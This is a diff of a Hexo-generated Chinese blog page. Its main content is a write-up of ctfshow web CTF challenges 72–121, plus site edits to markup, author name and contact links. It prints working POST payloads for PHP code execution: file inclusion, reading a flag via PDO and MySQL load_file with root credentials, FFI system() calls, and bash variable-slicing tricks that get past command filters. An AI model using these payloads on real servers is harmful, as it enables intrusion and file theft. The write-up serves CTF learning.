+ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();
+?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最终</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=上面的代码</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+c&#x3D;上面的代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <h5 id="73"><a href="#73" class="headerlink" title="73"></a>73</h5><p>include回来里，flagc.txt</p>
-<h5 id="74"><a href="#74" class="headerlink" title="74"></a>74</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=include(&#x27;/flagx.txt&#x27;);exit();</span><br></pre></td></tr></table></figure>
+<h5 id="74"><a href="#74" class="headerlink" title="74"></a>74</h5><pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+c&#x3D;include(&#39;&#x2F;flagx.txt&#39;);exit();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>首先扫目录，同上题payload，而后发现在根目录有flagx.txt尝试包含成功</p>
 <h5 id="75"><a href="#75" class="headerlink" title="75"></a>75</h5><p>ban掉了open_basedir访问文件的方式，只能通过别的方法来访问文件，可以通过mysql访问，在前面几题中可以找到mysql的账号密码，最终payload如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=<span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">  <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">payload:
+POST
+c&#x3D;try &#123;
+  $dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);
+  foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)
+	&#123;
+    echo($row[0]); 
+  &#125;
+  $dbh &#x3D; null;
+&#125;
+catch (PDOException $e) 
+&#123;
+  echo $e-&gt;getMessage();
+  exit(0);
+&#125;
+exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>拓展PDO知识：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。</span><br><span class="line">PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。</span><br><span class="line">PDO随PHP5.<span class="number">1</span>发行，在PHP5.<span class="number">0</span>的PECL扩展中也可以使用，无法运行于之前的PHP版本。</span><br><span class="line">一个实例</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbms</span>=<span class="string">&#x27;mysql&#x27;</span>;     <span class="comment">//数据库类型</span></span><br><span class="line"><span class="variable">$host</span>=<span class="string">&#x27;localhost&#x27;</span>; <span class="comment">//数据库主机名</span></span><br><span class="line"><span class="variable">$dbName</span>=<span class="string">&#x27;test&#x27;</span>;    <span class="comment">//使用的数据库</span></span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;root&#x27;</span>;      <span class="comment">//数据库连接用户名</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;&#x27;</span>;          <span class="comment">//对应的密码</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;<span class="subst">$dbms</span>:host=<span class="subst">$host</span>;dbname=<span class="subst">$dbName</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>); <span class="comment">//初始化一个PDO对象</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;连接成功&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">/*你还可以进行一次搜索操作</span></span><br><span class="line"><span class="comment">    foreach ($dbh-&gt;query(&#x27;SELECT * from FOO&#x27;) as $row) &#123;</span></span><br><span class="line"><span class="comment">        print_r($row); //你可以用 echo($GLOBAL); 来看到这些值</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span> (<span class="string">&quot;Error!: &quot;</span> . <span class="variable">$e</span>-&gt;getMessage() . <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true) 变成这样：</span></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="keyword">array</span>(PDO::ATTR_PERSISTENT =&gt; <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。
+PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。
+PDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。
+一个实例
+&lt;?php
+$dbms&#x3D;&#39;mysql&#39;;     &#x2F;&#x2F;数据库类型
+$host&#x3D;&#39;localhost&#39;; &#x2F;&#x2F;数据库主机名
+$dbName&#x3D;&#39;test&#39;;    &#x2F;&#x2F;使用的数据库
+$user&#x3D;&#39;root&#39;;      &#x2F;&#x2F;数据库连接用户名
+$pass&#x3D;&#39;&#39;;          &#x2F;&#x2F;对应的密码
+$dsn&#x3D;&quot;$dbms:host&#x3D;$host;dbname&#x3D;$dbName&quot;;
+
+try &#123;
+    $dbh &#x3D; new PDO($dsn, $user, $pass); &#x2F;&#x2F;初始化一个PDO对象
+    echo &quot;连接成功&lt;br&#x2F;&gt;&quot;;
+    &#x2F;*你还可以进行一次搜索操作
+    foreach ($dbh-&gt;query(&#39;SELECT * from FOO&#39;) as $row) &#123;
+        print_r($row); &#x2F;&#x2F;你可以用 echo($GLOBAL); 来看到这些值
+    &#125;
+    *&#x2F;
+    $dbh &#x3D; null;
+&#125; catch (PDOException $e) &#123;
+    die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br&#x2F;&gt;&quot;);
+&#125;
+&#x2F;&#x2F;默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT &#x3D;&gt; true) 变成这样：
+$db &#x3D; new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT &#x3D;&gt; true));
+
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h5 id="76"><a href="#76" class="headerlink" title="76"></a>76</h5><p>同上改名字</p>
 <h5 id="77"><a href="#77" class="headerlink" title="77"></a>77</h5><p>首先还是扫目录，文件名flag36x.txt，尝试上题方法发现数据库消失，看提示是PHP7.4以上的新特性，可以通过新建一个FFI对象来执行系统命令，又因为执行系统命令后没有回显，所以我们把执行后的结果放到网站目录下的一个文本文件中进行读取</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=<span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; /var/www/html/1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token punctuation">:</span>
+<span class="token constant">POST</span>
+c<span class="token operator">=</span><span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'/readflag > /var/www/html/1.txt'</span><span class="token punctuation">;</span>
+<span class="token variable">$ffi</span><span class="token operator">-></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后访问/1.txt即可</p>
 <h5 id="118"><a href="#118" class="headerlink" title="118"></a>118</h5><p>首先查看源码，发现输入被包含到system函数中执行，尝试<code>echo，whoami，ls，cat</code>全部失效想方法绕过，输入空格发现可以执行，所以可以尝试通过构造系统变量来执行，查看提示的图片</p>
 <p>![](<a target="_blank" rel="noopener" href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-21">https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21</a> 16.39.03.png)</p>
 <p>发现是默认配置文件下的文件名列表，可以通过剪裁构造变量，读取文件命令最容易进行构造的就是<code>nl</code>，想拼接出nl只需要取系统配置变量最后一位n和当前执行目录最后一位l即可，最终payload如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:$&#123;PATH:~0&#125;$&#123;PWD:~0&#125;$IFS????.???</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:$&#123;PATH:~0&#125;$&#123;PWD:~0&#125;$IFS????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>发现还是不行，是因为过滤了数字，没关系，剪裁字符还可通过大写字母解决，真·最终payload如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>系统变量补充知识</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$PATH 系统配置变量</span><br><span class="line">$PWD 当前执行目录</span><br><span class="line">$HOME 默认进入的目录</span><br><span class="line">$SHELL</span><br><span class="line">$USER 当前user</span><br><span class="line">$SHLVL 代表当前shell窗口的深度，一般为1</span><br><span class="line">$PHP_CFLAGS 指定头文件（.h文件）的路径，如：CFLAGS=-I/usr/include -I/path/include。同样地，安装一个包时会在安装路径下建立一个include目录，当安装过程中出现问题时，试着把以前安装的包的include目录加入到该变量中来。</span><br><span class="line">$PHP_VERSION PHP版本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$PATH 系统配置变量
+$PWD 当前执行目录
+$HOME 默认进入的目录
+$SHELL
+$USER 当前user
+$SHLVL 代表当前shell窗口的深度，一般为1
+$PHP_CFLAGS 指定头文件（.h文件）的路径，如：CFLAGS&#x3D;-I&#x2F;usr&#x2F;include -I&#x2F;path&#x2F;include。同样地，安装一个包时会在安装路径下建立一个include目录，当安装过程中出现问题时，试着把以前安装的包的include目录加入到该变量中来。
+$PHP_VERSION PHP版本
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>Linux变量补充知识</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;变量名:从哪一位开始取:取多长&#125;，如没有长度默认取到最后，如果没有起始位就从头开始</span><br><span class="line">$&#123;#变量名&#125;，代表这个变量的长度</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$&#123;变量名:从哪一位开始取:取多长&#125;，如没有长度默认取到最后，如果没有起始位就从头开始
+$&#123;#变量名&#125;，代表这个变量的长度
+$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <h5 id="119"><a href="#119" class="headerlink" title="119"></a>119</h5><p>先尝试上一把的是否可行，不行所以直接看提示吧，系统变量的知识补充在上一道题了，针对本题</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHLVL的值为2，#SHLVL的值为1，从PHP_VERSION的第二位取一个为3，也就是$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;为3，最终取</span><br><span class="line">PHP_CFLAGS变量从第三位开始的前三个即可构造tac</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">SHLVL的值为2，#SHLVL的值为1，从PHP_VERSION的第二位取一个为3，也就是$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;为3，最终取
+PHP_CFLAGS变量从第三位开始的前三个即可构造tac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>最终payload如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:$&#123;PHP_CFLAGS:$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;:$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;&#125; ????.???</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:$&#123;PHP_CFLAGS:$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;:$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;&#125; ????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h5 id="120"><a href="#120" class="headerlink" title="120"></a>120</h5><p>上一把的字符太长了，只能通过别的命令读取了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips：Linux中的base64在/bin目录之下，base64 文件名即可将文件进行base64编码</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">tips：Linux中的base64在&#x2F;bin目录之下，base64 文件名即可将文件进行base64编码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>所以我们最终构造出结果为/bin/base64 flag.php即可</p>
 <p>首先是/字符，PWD首位，而后bin可使用通配符，尝试base64也使用通配符不可行，所以我们尝试构建出数字4来匹配</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips：RANDOM变量能生成一万以内的随机数，用#取长度即可有概率得到4</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">tips：RANDOM变量能生成一万以内的随机数，用#取长度即可有概率得到4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>最终payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+code&#x3D;$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><del>多刷新几次总会出来的</del></p>
 <p>![](<a target="_blank" rel="noopener" href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-21">https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21</a> 19.36.51.png)</p>
 <h5 id="121"><a href="#121" class="headerlink" title="121"></a>121</h5><p>尝试上题payload，发现SHLVL被过滤了，所以我们需要一个1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips:通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">tips:通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>所以我们使用$</p>
 <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
@@ -670,7 +982,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -693,7 +1005,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -745,39 +1057,6 @@
                 </div>
             </div>
             
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
-            
         </div>
     </div>
 
@@ -819,9 +1098,8 @@
                     <div class="summary block-with-text">
                         
                             文件包含常见的文件包含漏洞函数：include()，require()
-本地包含利用方式：1、php://input：12?file=php://input请求体内为PHP代码：&lt;?php phpinfo(); ?&gt;
-
-php:
+本地包含利用方式：1、php://input：?file&#x3D;php:&#x2F;&#x2F;input
+请求体内为PHP代码：&lt;?php phpinfo(
                         
                     </div>
                     <div class="publish-info">
@@ -831,7 +1109,7 @@ php:
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -883,7 +1161,7 @@ HTTPS 443端口 加密后数据传输
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -910,6 +1188,9 @@ HTTPS 443端口 加密后数据传输
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -1018,69 +1299,15 @@ HTTPS 443端口 加密后数据传输
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -1115,7 +1342,7 @@ HTTPS 443端口 加密后数据传输
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -1123,10 +1350,8 @@ HTTPS 443端口 加密后数据传输
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -1135,9 +1360,7 @@ HTTPS 443端口 加密后数据传输
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1297,6 +1520,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1323,8 +1554,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
